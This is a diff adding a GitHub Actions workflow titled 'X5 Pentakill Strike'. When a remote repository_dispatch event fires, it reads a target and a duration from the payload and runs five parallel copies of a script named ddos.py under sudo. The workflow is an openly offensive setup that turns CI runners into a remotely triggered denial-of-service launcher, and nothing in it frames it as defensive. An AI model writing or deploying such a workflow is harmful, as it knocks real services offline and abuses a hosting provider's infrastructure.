@@ -1,0 +1,22 @@
+
+name: X5 Pentakill Strike
+on:
+  repository_dispatch:
+    types: [aether_dispatch]
+jobs:
+  strike:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Setup Environment
+        run: pip install requests colorama PySocks
+      - name: Activate X5 Striking
+        run: |
+          TARGET="${{ github.event.client_payload.target }}"
+          DUR="${{ github.event.client_payload.duration }}"
+          
+          # Cơ chế echo input và chạy song song (&) 5 tiến trình
+          for i in {1..5}; do
+            (echo "$TARGET"; sleep 1; echo "$DUR") | sudo timeout ${DUR}s python ddos.py &
+          done
+          wait
